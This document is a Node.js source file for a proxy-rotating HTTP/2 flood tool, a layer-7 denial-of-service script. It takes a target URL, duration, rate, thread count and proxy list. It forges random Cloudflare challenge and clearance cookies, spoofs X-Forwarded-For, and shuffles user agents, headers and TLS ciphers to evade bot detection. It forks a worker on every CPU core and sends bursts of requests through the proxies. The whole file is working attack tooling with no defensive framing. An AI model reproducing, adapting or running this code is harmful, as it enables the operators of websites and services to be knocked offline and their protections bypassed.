const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node target time rate thread proxyfile`);
    console.log(`options:
    --bypass low request `);
    process.exit();
}

function generateRandomCFToken(type) {
  if (type === '__cf_chl_tk') {
    const randomString = crypto.randomBytes(20).toString('base64') 
      .replace(/\+/g, '-') 
      .replace(/\//g, '_')  
      .replace(/=+$/, '');
    const timestamp = Math.floor(Date.now() / 1000); 
    return `__cf_chl_tk=${randomString}-${timestamp}-0-gaNycGzNFKU`;
  }

  if (type === '__cf_clearance') {
    const randomString = crypto.randomBytes(20).toString('base64') 
      .replace(/\+/g, '-')  
      .replace(/\//g, '_') 
      .replace(/=+$/, '');  
    const timestamp = Math.floor(Date.now() / 1000); 
    const randomPart1 = crypto.randomBytes(8).toString('hex');
    const randomPart2 = crypto.randomBytes(8).toString('hex');
    const randomPart3 = crypto.randomBytes(4).toString('hex');
    return `__cf_clearance=${randomString}-${timestamp}-0-1-${randomPart1}.${randomPart2}.${randomPart3}-160.0.0`;
  }

  
  if (type === '__cf_bm') {
    const randomString = crypto.randomBytes(30).toString('base64') 
      .replace(/\+/g, '-')  
      .replace(/\//g, '_')
      .replace(/=+$/, '');  
    const timestamp = Math.floor(Date.now() / 1000);
    return `__cf_bm=${randomString}-${timestamp}-1-${randomString}`;
  }
}


function getRandomToken() {
  const types = ['__cf_chl_tk', '__cf_clearance', '__cf_bm'];
  const randomType = types[Math.floor(Math.random() * types.length)]; 
  return generateRandomCFToken(randomType);
}
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ];
const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
const Methods = ["GET", "POST", "HEAD"];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    bypass: process.argv.includes('bypass')
};

var proxies = readLines(args.proxyFile); // Initialize proxies here


const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 3000;

const numCPUs = os.cpus().length; // Lấy số lượng core của hệ thống

if (cluster.isMaster) {
    console.clear();
    console.log(`brave but it flood or not wrk @cinnkoz`)
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log(`heap size: ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)}`);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 60000);
        connection.setKeepAlive(true, args.time * 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}
function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

const refers = ['google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'tiktok.com', 'github.com'];

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    
    const randomIntn = (min, max) => Math.floor(Math.random() * (max - min)) + min;

    const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Safari/537.36 Brave/116.1.58.127`,
    `Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.118 Mobile Safari/537.36 Brave/1.56`,
    `Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.118 Mobile Safari/537.36 Brave/1.56`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.179 Safari/537.36 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 Brave/116.1.58.127`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36`,
    ];
    
    const finalUa = userAgents[Math.floor(Math.random() * userAgents.length)];
    const Ref = refers[Math.floor(Math.random() * refers.length)];
     path = parsedTarget.path + "?" + getRandomToken();
   // path = sanitizePath(path);
   
const rateHeaders1 = {
"X-Forwarded-For": parsedProxy[0],
"source-ip" : randstr(5),
"Vary" : randstr(5)
};
const rateHeaders2 = {
"Service-Worker-Navigation-Preload" : "true",
"Supports-Loading-Mode" : "credentialed-prerender",
 "data-return" : "false",
};

    const headersbex = {
        ":method": randomElement(Methods),
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": path,
        'Accept': accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))],
        'Accept-Language': `'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'`,
        'Accept-Encoding': 'gzip, deflate, br',
        "cache-control": `"max-age=0", "no-store", "no-cache"`,
        "sec-ch-ua": `"Brave";v="1.58", "Chromium";v="116", "Not_A Brand";v="24"`,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "cookie": getRandomToken(),
        "X-Cache": "MISS",
        "sec-gpc": "1",
        "Access-Control-Allow-Origin": `https://${Ref}`,
        "Access-Control-Allow-Methods": `"GET", "POST", "HEAD"`,
        "Access-Control-Allow-Credentials": "false",
        "upgrade-insecure-requests": "1",
        "Origin": `https://${parsedTarget.host}`,
        "Referer": `https://${Ref}`,
        "DNT": "1",
    };
    const rhd = [
			{'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
			{'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
		];
		const hd1 = [
			{'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
      {'Delta-Base' : '12340001'},
       {"te": "trailers"},
		];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            dhparam: 'modp4096',
        };


 const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);

tlsBex.allowHalfOpen = true;
tlsBex.setNoDelay(true);
tlsBex.setKeepAlive(true, args.time * 1000);
tlsBex.setMaxListeners(0);

const bexClient = http2.connect(parsedTarget.href, {
    protocol: "https:",
    createConnection: () => tlsBex,
    settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 2000,
        initialWindowSize: 6291456,
        maxFrameSize: 16384,
        enablePush: false,
    },
});

const requestRate =  args.Rate;
const requestInterval = args.bypass ? Math.floor(1000) + randomIntn(200, 1000) : 50
const IntervalAttack = setInterval(() => {
const shuffleObject = (obj) => Object.fromEntries(Object.entries(obj).sort(() => Math.random() - 0.5));
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];

            let dynHeaders = shuffleObject({
                "user-agent": finalUa,
                ...(Math.random() < 0.5 && { rhd: [randomItem(rhd)] }),
                ...(Math.random() < 0.5 && { hd1: [randomItem(hd1)] }),
                ...headersbex,
                ...randomItem(rateHeaders1),
                ...randomItem(rateHeaders2),
            });
    for (let i = 0; i < requestRate; i++) {
        const bex = bexClient.request(dynHeaders, {
        weight: Math.random() < 0.5 ? 251 : 231,
        depends_on: 0,
        exclusive: Math.random() < 0.5 ? true : false,})
            .on('response', response => {
                    bex.close();
                    bex.destroy();
                    return
            });

        bex.end();
    }
}, requestInterval);

setTimeout(() => clearInterval(IntervalAttack), args.time * 300);

bexClient.on("close", () => {
    bexClient.destroy();
    connection.destroy();
    return runFlooder();
});

bexClient.on("error", (error) => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
      console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
      shouldPauseRequests = true; 
      setTimeout(() => {
          shouldPauseRequests = false;
      }, 2000);
    } else if (error.code === 'ECONNRESET') {
      console.log('Connection reset, pausing requests for 5 seconds\r');
      shouldPauseRequests = true;
      setTimeout(() => {
          shouldPauseRequests = false; 
      }, 5000);
    } else {
      const statusCode = error.response ? error.response.statusCode : null;
      if (statusCode === 403) {
        console.log('Received 403 error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
            shouldPauseRequests = false; 
        }, 10000);
      }
    }

    client.destroy();
    connection.destroy();
});

    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);